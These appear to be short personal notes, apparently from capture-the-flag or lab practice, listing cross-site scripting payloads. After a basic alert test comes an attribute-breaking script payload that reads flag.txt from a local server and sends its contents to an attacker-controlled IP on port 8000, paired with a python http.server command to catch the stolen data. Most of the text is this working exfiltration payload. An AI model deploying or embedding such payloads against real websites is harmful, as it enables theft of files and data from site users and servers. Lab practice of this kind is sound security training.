
```
<script type=’text/javascript’>alert(‘test’);</script>
```

o


to be sorted

this payloads sends a specific file(in this case flag.txt) to a python server on your host machine running on port 8000
```
'"><script>fetch('http://127.0.0.1:8080/flag.txt')  
    .then(response => response.text())  
    .then(data => {  
      fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));  
    });  
</script>
```
example of paired python server
```
python -m http.server 8000
```
you should receive the contents of the file on you python server if the payload worked correctly